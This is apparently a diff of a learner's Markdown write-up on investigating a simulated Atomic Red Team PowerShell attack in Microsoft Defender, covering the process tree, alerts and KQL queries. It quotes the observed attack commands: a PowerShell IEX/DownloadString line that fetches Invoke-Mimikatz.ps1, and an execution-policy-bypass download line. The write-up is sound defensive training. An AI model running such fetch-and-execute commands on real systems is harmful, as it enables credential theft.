@@ -2,7 +2,7 @@
 
 I wanted to share how I approached this investigation, the steps I took, my thought process and what I learned throughout the analysis.
 
-## Before even looking at the alerts
+## 5 Prepared Questions
 
 I had prepared five questions that I wanted to start my investigation:
 
@@ -16,7 +16,9 @@ I had prepared five questions that I wanted to start my investigation:
 
 This part was a bit confusing at first because as shown in the screenshot, it looks like [pid 14920] powershell.exe launched [pid 8540] cmd.exe. But after checking the timestamps, I realised that [pid 14920] powershell.exe belonged to an earlier user session. The real chain of events was that [pid 8540] cmd.exe created [pid 12236] powershell.exe, which then used DownloadString with IEX (Invoke-Expression) to pull a script from GitHub and run it directly as PowerShell code. This confirmed that the root cause was an interactive PowerShell session started by Jenny’s remote login, not an automated task or background service. That was the point where the simulated attack really began.
 
-*Insert image link here*
+[View Process Tree](Process-Tree.PNG)
+
+
 
 ## The Process Tree – What I Learnt
 
@@ -40,7 +42,8 @@ powershell.exe -exec bypass -noprofile "$comMsXml=New-Object -ComObject MsXml2.S
 
 The remote session came from 192.168.1.72, logged in as AzureAD\JennySmith.
 
-*Insert image here*
+[View Alert Timeline – Suspicious PowerShell Command Line](Alert-Timeline-Suspicious-Powershell-Command-Line.PNG)
+
 
 ### Alert 2: Suspicious Process Executed PowerShell Command
 
@@ -58,19 +61,24 @@ The command looked like this:
 C:\Windows\System32\cmd.exe /c powershell.exe IEX (New-Object Net.WebClient).DownloadString(...Invoke-Mimikatz.ps1)
 ```
 
-*Insert image here*
+[View Alert – Mimikatz Credential Theft Tool](Alert-Mimikatz-Credential-Theft-Tool.PNG)
+
+
 
 ## Advanced Hunting – KQL
 
 So far the Process Tree and Timeline have shown the story that started with a suspicious PowerShell command, then the process actually ran during Jenny’s RDP session, and finally it tried to execute Mimikatz to steal credentials but Defender stopped it. However I was keen to investigate the endpoints further and validate the alerts.
 
-I have listed all my KQL queries here and the results are as follows:
+I have listed all my KQL queries here : [View KQL Queries](../KQL/KQL-Queries.kql)
+
+
 
 ### KQL Query 1 – Confirm PowerShell Execution
 
 The KQL query on DeviceProcessEvents confirmed that at 16:05 BST, Jenny’s VM executed powershell.exe from cmd.exe using the IEX and DownloadString to pull a script from GitHub. This aligns exactly with the Defender alerts for suspicious PowerShell activity and validates that the simulated T1059.001 attack produced real telemetry.
 
-*Insert KQL image results*
+[View KQL Query Results – Confirm PowerShell Execution](../KQL/KQL-Query-Confirm-Poweshell-Execution.PNG)
+
 
 At this point, I already had all the answers I needed as far as the simulated attack goes. However I wanted to dig deeper and practise using KQL as if this was a real investigation.
 
@@ -84,7 +92,7 @@ It’s because the malicious code was blocked and never actually ran so there ar
 
 The results showed that only one device ran the suspicious PowerShell command. This was expected because I had only onboarded one endpoint to Defender. I just wanted to practise building the KQL queries.
 
-*Insert KQL image results*
+[View KQL Query Results – Confirm PowerShell Execution](../KQL/KQL-Spread-Powershell-Activity.PNG)
 
 ### KQL Query 4 – Look For Persistence
 
@@ -92,4 +100,4 @@ My persistence query came back with no results is because the Atomic Red Team si
 
 ## Conclusion
 
-I really enjoyed this investigation and found it a great way to put what I have been learning into practice. Running the Atomic Red Team simulation and then hunting through Defender helped me understand how alerts link together and what they actually mean. I want to make the most of this opportunity and keep improving my skills through the MyDFIR Skool and I am very grateful to Steven Mah for guiding us through it.
+I really enjoyed this investigation and found it a great way to put what I have been learning into practice. Running the Atomic Red Team simulation and then hunting through Defender helped me understand how alerts link together and what they actually mean. I wanted to make the most of this challenge and keep improving my skills through the MyDFIR Skool and I am very grateful to Steven Mah for guiding us through it.
